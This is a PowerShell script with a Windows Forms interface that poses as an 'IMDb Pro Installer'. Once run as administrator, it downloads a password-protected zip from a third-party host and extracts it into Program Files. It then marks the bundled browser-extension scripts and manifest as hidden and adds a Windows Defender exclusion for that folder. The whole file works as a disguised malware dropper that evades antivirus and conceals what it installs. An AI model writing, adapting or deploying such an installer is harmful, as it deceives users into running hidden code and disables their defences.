# IMDb Pro Installer - Simplified and More Robust Version
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create a simpler form
 $mainForm = New-Object System.Windows.Forms.Form
 $mainForm.Text = "IMDb Pro Installer"
 $mainForm.Size = New-Object System.Drawing.Size(500, 400)
 $mainForm.StartPosition = "CenterScreen"
 $mainForm.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 35)
 $mainForm.ForeColor = [System.Drawing.Color]::White

# Title
 $titleLabel = New-Object System.Windows.Forms.Label
 $titleLabel.Text = "🎬 IMDb Pro Installer"
 $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
 $titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
 $titleLabel.AutoSize = $true
 $titleLabel.Location = New-Object System.Drawing.Point(150, 30)
 $mainForm.Controls.Add($titleLabel)

# Status label
 $statusLabel = New-Object System.Windows.Forms.Label
 $statusLabel.Text = "Ready to install"
 $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
 $statusLabel.AutoSize = $true
 $statusLabel.Location = New-Object System.Drawing.Point(50, 100)
 $mainForm.Controls.Add($statusLabel)

# Progress bar
 $progressBar = New-Object System.Windows.Forms.ProgressBar
 $progressBar.Location = New-Object System.Drawing.Point(50, 140)
 $progressBar.Size = New-Object System.Drawing.Size(400, 20)
 $progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
 $progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
 $mainForm.Controls.Add($progressBar)

# Log text box
 $logTextBox = New-Object System.Windows.Forms.TextBox
 $logTextBox.Multiline = $true
 $logTextBox.ScrollBars = "Vertical"
 $logTextBox.Location = New-Object System.Drawing.Point(50, 180)
 $logTextBox.Size = New-Object System.Drawing.Size(400, 120)
 $logTextBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 50)
 $logTextBox.ForeColor = [System.Drawing.Color]::White
 $logTextBox.Font = New-Object System.Drawing.Font("Consolas", 9)
 $logTextBox.ReadOnly = $true
 $mainForm.Controls.Add($logTextBox)

# Install button
 $installButton = New-Object System.Windows.Forms.Button
 $installButton.Text = "Install IMDb Pro"
 $installButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
 $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
 $installButton.ForeColor = [System.Drawing.Color]::Black
 $installButton.Size = New-Object System.Drawing.Size(150, 40)
 $installButton.Location = New-Object System.Drawing.Point(175, 320)
 $mainForm.Controls.Add($installButton)

# Function to update log
function Update-Log {
    param([string]$Message, [string]$Color = "White")
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    
    # Add to log textbox
    $logTextBox.AppendText("$logMessage`r`n")
    $logTextBox.SelectionStart = $logTextBox.TextLength
    $logTextBox.ScrollToCaret()
    
    # Also write to console for debugging
    switch ($Color) {
        "Green" { Write-Host $logMessage -ForegroundColor Green }
        "Yellow" { Write-Host $logMessage -ForegroundColor Yellow }
        "Red" { Write-Host $logMessage -ForegroundColor Red }
        "Cyan" { Write-Host $logMessage -ForegroundColor Cyan }
        default { Write-Host $logMessage }
    }
    
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to update status and progress
function Update-Status {
    param([string]$Status, [int]$Progress = -1)
    
    $statusLabel.Text = $Status
    if ($Progress -ge 0 -and $Progress -le 100) {
        $progressBar.Value = $Progress
    }
    
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to download file with multiple methods
function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    
    Update-Log "Attempting to download from: $Url" "Cyan"
    
    # Method 1: WebClient
    try {
        Update-Log "Trying download with WebClient..." "Cyan"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.DownloadFile($Url, $OutputPath)
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "WebClient download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "WebClient download failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 2: Invoke-WebRequest
    try {
        Update-Log "Trying download with Invoke-WebRequest..." "Cyan"
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "Invoke-WebRequest download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "Invoke-WebRequest download failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 3: BitsTransfer
    try {
        Update-Log "Trying download with BitsTransfer..." "Cyan"
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $Url -Destination $OutputPath -Description "IMDb Pro Download"
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "BitsTransfer download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "BitsTransfer download failed: $($_.Exception.Message)" "Red"
    }
    
    Update-Log "All download methods failed" "Red"
    return $false
}

# Function to extract ZIP using multiple methods
function Extract-ZIP {
    param(
        [string]$ZipFile,
        [string]$Destination,
        [string]$Password
    )
    
    Update-Log "Attempting to extract: $ZipFile" "Cyan"
    Update-Log "Destination: $Destination" "Cyan"
    Update-Log "Password: $Password" "Cyan"
    
    # Ensure destination exists
    if (-not (Test-Path $Destination)) {
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        Update-Log "Created destination directory" "Green"
    }
    
    # Method 1: .NET ExtractToDirectory
    try {
        Update-Log "Trying extraction with .NET..." "Cyan"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
        
        $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
        Update-Log ".NET extraction successful. Extracted $extractedFiles files" "Green"
        return $true
    }
    catch {
        Update-Log ".NET extraction failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 2: Shell Application
    try {
        Update-Log "Trying extraction with Shell Application..." "Cyan"
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace((Resolve-Path $ZipFile).Path)
        $dest = $shell.NameSpace((Resolve-Path $Destination).Path)
        
        $dest.CopyHere($zip.Items(), 0x14) # 0x14 = No progress UI + Yes to all
        
        # Wait for extraction to complete
        Start-Sleep -Seconds 5
        
        $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
        if ($extractedFiles -gt 0) {
            Update-Log "Shell extraction successful. Extracted $extractedFiles files" "Green"
            return $true
        } else {
            Update-Log "Shell extraction completed but no files found" "Yellow"
        }
    }
    catch {
        Update-Log "Shell extraction failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 3: 7-Zip if available
    $7zipPaths = @(
        "7z.exe",
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
    )
    
    foreach ($path in $7zipPaths) {
        if (Test-Path $path) {
            try {
                Update-Log "Trying extraction with 7-Zip ($path)..." "Cyan"
                
                $arguments = @(
                    "x",           # Extract
                    "-p$Password", # Password
                    "-o$Destination", # Output directory
                    "-y",          # Yes to all
                    $ZipFile       # Archive file
                )
                
                $process = Start-Process -FilePath $path -ArgumentList $arguments -Wait -PassThru -NoNewWindow
                
                if ($process.ExitCode -eq 0) {
                    $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
                    Update-Log "7-Zip extraction successful. Extracted $extractedFiles files" "Green"
                    return $true
                } else {
                    Update-Log "7-Zip extraction failed with exit code: $($process.ExitCode)" "Red"
                }
            }
            catch {
                Update-Log "7-Zip extraction error: $($_.Exception.Message)" "Red"
            }
        }
    }
    
    Update-Log "All extraction methods failed" "Red"
    return $false
}

# Function to hide files
function Hide-SensitiveFiles {
    param([string]$FolderPath)
    
    Update-Log "Attempting to hide sensitive files in: $FolderPath" "Cyan"
    
    # List all files in the directory and subdirectories
    $allFiles = Get-ChildItem $FolderPath -Recurse -File
    Update-Log "Found $($allFiles.Count) files total" "Cyan"
    
    # List the files for debugging
    foreach ($file in $allFiles) {
        Update-Log "Found file: $($file.FullName)" "Cyan"
    }
    
    # Files we want to hide
    $targetFiles = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
    $hiddenCount = 0
    
    foreach ($targetFile in $targetFiles) {
        # Look for the file in the directory and subdirectories
        $filesToHide = $allFiles | Where-Object { $_.Name -eq $targetFile }
        
        if ($filesToHide.Count -eq 0) {
            Update-Log "Target file not found: $targetFile" "Yellow"
            continue
        }
        
        foreach ($file in $filesToHide) {
            try {
                # Set file attributes to Hidden
                Set-ItemProperty -Path $file.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
                Update-Log "Hidden file: $($file.FullName)" "Green"
                $hiddenCount++
            }
            catch {
                Update-Log "Failed to hide file $($file.FullName): $($_.Exception.Message)" "Red"
            }
        }
    }
    
    Update-Log "Successfully hid $hiddenCount files" "Green"
}

# Main installation function
function Start-Installation {
    $installButton.Enabled = $false
    $logTextBox.Clear()
    
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb_pro_$([Guid]::NewGuid().ToString()).zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Check admin privileges
        Update-Status "Checking administrator privileges..." 10
        Update-Log "Checking administrator privileges..." "Cyan"
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0
            Update-Log "ERROR: Administrator privileges required" "Red"
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", "OK", "Warning")
            $installButton.Enabled = $true
            return
        }
        
        Update-Log "Administrator privileges confirmed" "Green"
        
        # Create installation directory
        Update-Status "Creating installation directory..." 20
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
            Update-Log "Created installation directory: $installPath" "Green"
        }
        
        # Download file
        Update-Status "Downloading IMDb Pro package..." 30
        $downloadSuccess = Download-File -Url $downloadUrl -OutputPath $tempFile
        
        if (-not $downloadSuccess) {
            throw "Download failed"
        }
        
        Update-Status "Download completed" 50
        
        # Extract ZIP
        Update-Status "Extracting files..." 70
        $extractionSuccess = Extract-ZIP -ZipFile $tempFile -Destination $installPath -Password $zipPassword
        
        if (-not $extractionSuccess) {
            throw "Extraction failed"
        }
        
        Update-Status "Extraction completed" 85
        
        # Hide sensitive files
        Update-Status "Securing files..." 90
        Hide-SensitiveFiles -FolderPath $installPath
        
        # Clean up
        Update-Status "Finalizing installation..." 95
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
            Update-Log "Cleaned up temporary file" "Green"
        }
        
        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
            Update-Log "Added Windows Defender exclusion" "Green"
        }
        catch {
            Update-Log "Failed to add Windows Defender exclusion: $($_.Exception.Message)" "Yellow"
        }
        
        # Success
        Update-Status "Installation completed successfully!" 100
        Update-Log "Installation completed successfully!" "Green"
        
        $installButton.Text = "Installation Complete"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        
        [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`nLocation: $installPath",
            "Installation Complete",
            "OK",
            "Information"
        )
    }
    catch {
        Update-Status "Installation failed" 0
        Update-Log "Installation failed: $($_.Exception.Message)" "Red"
        
        # Clean up on error
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Update-Log "Cleaned up temporary file after error" "Yellow"
        }
        
        $installButton.Text = "Retry Installation"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)",
            "Installation Error",
            "OK",
            "Error"
        )
    }
}

# Button click event
 $installButton.Add_Click({ Start-Installation })

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
 $mainForm.ShowDialog() | Out-Null
